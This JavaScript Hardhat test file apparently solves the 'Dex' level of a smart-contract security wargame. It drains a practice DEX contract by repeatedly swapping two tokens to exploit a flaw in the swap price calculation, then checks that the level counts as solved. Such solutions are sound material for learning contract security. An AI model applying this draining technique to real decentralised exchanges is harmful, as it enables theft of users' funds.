const { expect } = require("chai");
const { ethers } = require("hardhat");

const { setupLevel } = require("./utils");

describe("Dex", async function () {
    let deployer;
    let player;
    let factory;
    let instance;

    before(async function () {
        [deployer, player] = await ethers.getSigners();

        level = await setupLevel("Dex", player.address);
        factory = level.factory;
        instance = level.instance;
    });

    it("Exploit", async function () {
        // Turn on logger to debug the attack logic
        let on = false;

        async function swap(from, to, _amount) {
            let balBeforeToken1 = await from.balanceOf(player.address);
            let balBeforeToken2 = await to.balanceOf(player.address);

            await from.connect(player)["approve(address,address,uint256)"](player.address, instance.address, balBeforeToken1);
            await instance.connect(player).swap(from.address, to.address, _amount);

            balAfterToken1 = await from.balanceOf(player.address);
            balAfterToken2 = await to.balanceOf(player.address);

            expect(balAfterToken1).to.be.lessThan(balBeforeToken1);
            expect(balAfterToken2).to.be.greaterThan(balBeforeToken2);

            logger();
        }

        const token1 = (await ethers.getContractFactory("SwappableToken")).attach(await instance.token1());
        const token2 = (await ethers.getContractFactory("SwappableToken")).attach(await instance.token2());

        await swap(token1, token2, await token1.balanceOf(player.address));
        await swap(token2, token1, await token2.balanceOf(player.address));
        await swap(token1, token2, await token1.balanceOf(player.address));
        await swap(token2, token1, await token2.balanceOf(player.address));
        await swap(token1, token2, await token1.balanceOf(player.address));
        await swap(token2, token1, 45);

        async function logger() {
            if (!on) return;

            const t1bp = (await token1.balanceOf(player.address)).toString().padStart(5, " ").padEnd(7, " ");
            const t2bp = (await token2.balanceOf(player.address)).toString().padStart(5, " ").padEnd(7, " ");
            const t1bd = (await token1.balanceOf(instance.address)).toString().padStart(5, " ").padEnd(7, " ");
            const t2bd = (await token2.balanceOf(instance.address)).toString().padStart(5, " ").padEnd(7, " ");

            const line1 = `====================================`;
            const line2 = `  XXXXXXX |  PLAYER   |    DEX    | `;
            const line3 = `====================================`;
            const line4 = `------------------------------------`;
            const line5 = ` | TOKEN1 |  ${t1bp}  |  ${t1bd}  | `;
            const line6 = `------------------------------------`;
            const line7 = ` | TOKEN2 |  ${t2bp}  |  ${t2bd}  |`;
            const line8 = `------------------------------------`;

            const output = [line1, line2, line3, line4, line5, line6, line7, line8].join("\n");

            console.log();
            console.log(output);
            console.log();
        }
    });

    after(async function () {
        expect(await factory.callStatic.validateInstance(instance.address, player.address)).to.be.true;
    });
});